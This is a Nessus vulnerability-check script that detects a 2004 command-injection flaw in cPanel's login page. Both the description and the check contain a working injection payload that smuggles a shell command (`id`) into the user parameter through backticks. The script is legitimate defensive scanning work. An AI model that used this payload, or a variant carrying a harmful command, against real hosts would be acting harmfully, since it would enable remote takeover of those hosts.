#
# (C) Tenable Network Security
#
# 

 desc = '
The remote host is running cPanel.

There is a bug in this software which may allow an attacker to execute arbitrary
commands on this host with the privileges of the cPanel web server, by sending
a malformed login as in :

	http://www.example.com:2082/login/?user=|"`id`"|

An attacker may exploit this flaw to execute arbitrary commands on the remote
host and take its control.

Solution : Upgrade to the newest version of cPanel or disable this service
Risk factor : High';


if(description)
{
 script_id(12097);
 script_cve_id("CVE-2004-1769", "CVE-2004-1770", "CVE-2004-2308");
 script_bugtraq_id(9848, 9853, 9855);
 script_version("$Revision: 1.10 $");

 name["english"] = "cPanel Login Command Execution";
 script_name(english:name["english"]);

 script_description(english:desc);
 
 summary["english"] = "Command Injection";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 2082);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			default_port:2082,
			unique_dir:"/login",
			check_request:'/?user=|"`id`"|',
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
